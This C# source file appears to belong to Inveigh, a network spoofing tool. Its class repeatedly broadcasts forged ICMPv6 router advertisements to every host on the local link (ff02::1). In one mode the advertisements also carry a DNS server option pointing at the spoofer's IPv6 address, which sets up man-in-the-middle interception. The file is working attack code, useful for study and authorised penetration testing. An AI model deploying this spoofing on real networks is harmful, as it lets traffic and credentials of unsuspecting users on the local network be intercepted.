using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;

namespace Inveigh
{
    class ICMPv6
    {
        public static void icmpv6RouterAdvertise()
        {
            Program.icmpv6Interval *= 1000;  
            string responseMessage = "";

            while (!Program.exitInveigh)
            {

                using (MemoryStream memoryStream = new MemoryStream())
                {

                    if (Program.enabledDHCPv6)
                    {
                        memoryStream.Write((new byte[16] { 0x86, 0x00, 0x00, 0x00, 0x00, 0xc8, 0x07, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 16);
                    }
                    else
                    {
                        memoryStream.Write((new byte[16] { 0x86, 0x00, 0x00, 0x00, 0x00, 0x08, 0x07, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 16);
                        memoryStream.Write((new byte[8] { 0x19, 0x3, 0x00, 0x00, 0x00, 0x00, 0x07, 0x08 }), 0, 8);      
                        memoryStream.Write(Program.spooferIPv6Data, 0, Program.spooferIPv6Data.Length);
                        responseMessage = " with DNSv6 ";
                    }

                    Socket icmpv6SendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.IcmpV6);
                    icmpv6SendSocket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.MulticastTimeToLive, 255);
                    icmpv6SendSocket.SendBufferSize = (int)memoryStream.Length;
                    IPEndPoint icmpv6EndPoint = new IPEndPoint(IPAddress.Parse("ff02::1"), 0);
                    icmpv6SendSocket.SendTo(memoryStream.ToArray(), (int)memoryStream.Length, SocketFlags.None, icmpv6EndPoint);
                    icmpv6SendSocket.Close();
                }

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] ICMPv6 router advertisment{1}sent to ff02::1", DateTime.Now.ToString("s"), responseMessage));
                }

                if (Program.icmpv6Interval > 0)
                {
                    Thread.Sleep(Program.icmpv6Interval);
                }
                else
                {
                    break;
                }

            }

        }

    }

}
